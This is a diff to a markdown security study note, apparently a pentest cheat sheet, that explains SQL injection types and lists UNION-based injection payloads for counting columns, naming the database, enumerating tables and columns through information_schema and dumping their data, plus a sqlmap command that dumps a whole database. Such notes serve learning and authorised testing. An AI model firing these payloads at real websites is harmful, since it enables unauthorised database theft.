@@ -129,9 +129,47 @@ Structured Query Language (SQL) is a standarized language for relational databas
 SQL Injection is the vulnerability of websites that accept unsanitized data from input forms and forward them as a query to databases. There are several types of SQLi:
 
 - In-band-SQLi: further divided in
-      - Error-based SQLi: you gain info about database structure directly from
-      - Union-based SQLi
-- Blind-SQLi:
+      - Error-based SQLi: you gain info about database structure directly from the browser error answer
+      - Union-based SQLi: makes use of the UNION clause in order to insert in an "empty" server answer, the SELECT data of our interest.
+- Blind-SQLi: in this case you must apply a deductive method, making qeries and waiting for positive or negative answer (Boolean-SQLi). For example, by means of the SLEEP(2); it is possible to verify the answer, if the asnwer comes after 2s, this means "True", otherwise it is "False".
+
+## Manual SQLi
+
+- Check for number of columns in the TABLE: 
+
+      ' UNION SELECT null ; --  
+      ' UNION SELECT null,null ; --
+      ' UNION SELECT null,null,null ; --
+
+- Get name of the database (which in addition could contain several tables):
+
+      ' UNION SELECT null,null,database() ; -- 
+      
+- Now proceed with enumeration of tables in the database to get confidential infos:
+
+      ' UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema='[db_name]' ; -- 
+      
+Where `information_schema` is a shared data structure of database which contains several attributes (for additional informations check [here](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/
+)).
+If we are referring to the entire DB, we will use: `information_schema.tables WHERE table_schema='...` while if we are referring to a table we will call: `information_schema.columns WHERE table_name='...`
+
+- Dump columns in a specified table: 
+
+      ' UNION SELECT null,null,group_concat(column_name) FROM information_schema.columns WHERE table_name = '[table_name]' ; -- 
+      
+- Get entire columns data:
+
+      ' UNION SELECT [column_name1],[column_name2],[column_name3] FROM [table_name] ; -- 
+
+
+## Automated SQLi
+
+Intercept a HTML request for which a SQLi vulnerability is possible. Save this request to a .txt file. Then:
+
+    sqlmap -r request.txt --dbms=mysql --dump
+
+
+
 
 
 
